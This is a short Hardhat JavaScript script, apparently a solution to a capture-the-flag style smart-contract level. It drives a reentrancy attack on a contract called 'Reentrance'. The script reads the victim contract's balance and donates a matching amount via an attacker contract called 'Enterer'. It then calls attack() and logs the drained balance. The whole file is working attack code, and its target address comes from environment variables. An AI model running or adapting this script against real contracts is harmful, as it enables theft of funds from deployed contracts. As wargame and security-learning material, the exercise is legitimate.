const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const [owner] = await ethers.getSigners();

  const reent = await ethers.getContractAt("Reentrance", process.env.REENT_ADDR)

  const ent = hre.network.name == "hardhat"
    ? await deploy(reent.address)
    : await ethers.getContractAt("Enterer", process.env.ENT_ADDR);

  const victimBal = await ethers.provider.getBalance(reent.address)

  console.log(`Initial victim balance: ${victimBal}`)

  await reent.donate(ent.address, {value: victimBal})

  console.log(`Attacker contract balance on contract: ${await reent.balanceOf(ent.address)}`)

  await ent.attack({
    gasLimit: 1e5
  });

  console.log(`Contract balance: ${await ethers.provider.getBalance(reent.address)}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
